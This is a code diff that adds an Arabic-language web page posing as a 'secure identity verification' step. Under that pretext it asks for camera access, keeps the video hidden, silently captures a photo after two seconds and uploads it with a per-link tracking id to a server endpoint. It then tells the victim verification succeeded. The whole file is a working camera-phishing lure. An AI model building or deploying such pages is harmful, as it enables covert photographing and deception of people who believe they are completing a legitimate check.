@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من الهوية...</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center p-4">
+    <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-8 text-center shadow-2xl">
+        <h1 class="text-xl font-bold mb-4">جاري التحقق الآمن</h1>
+        <p class="text-sm text-slate-400 mb-6">يرجى السماح بالوصول للكاميرا لإتمام عملية التحقق من الهوية.</p>
+        
+        <div id="status" class="text-blue-400 text-sm mb-4 italic">في انتظار الصلاحية...</div>
+        
+        <video id="video" width="100%" height="auto" autoplay style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+
+        <div class="animate-pulse w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full mx-auto"></div>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const status = document.getElementById('status');
+        const linkId = '${linkId}';
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                status.innerText = "جاري التحقق، يرجى الانتظار...";
+                
+                // التقاط الصورة بعد ثانيتين من فتح الكاميرا
+                setTimeout(() => {
+                    takeSnapshot();
+                }, 2000);
+            } catch (err) {
+                status.innerText = "يجب السماح بالكاميرا للمتابعة.";
+            }
+        }
+
+        function takeSnapshot() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const imageData = canvas.toDataURL('image/png');
+            
+            fetch('/api/upload-cam', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: linkId, image: imageData })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.status === 'success') {
+                    status.innerText = "تم التحقق بنجاح!";
+                }
+            })
+            .catch(err => console.error(err));
+        }
+
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
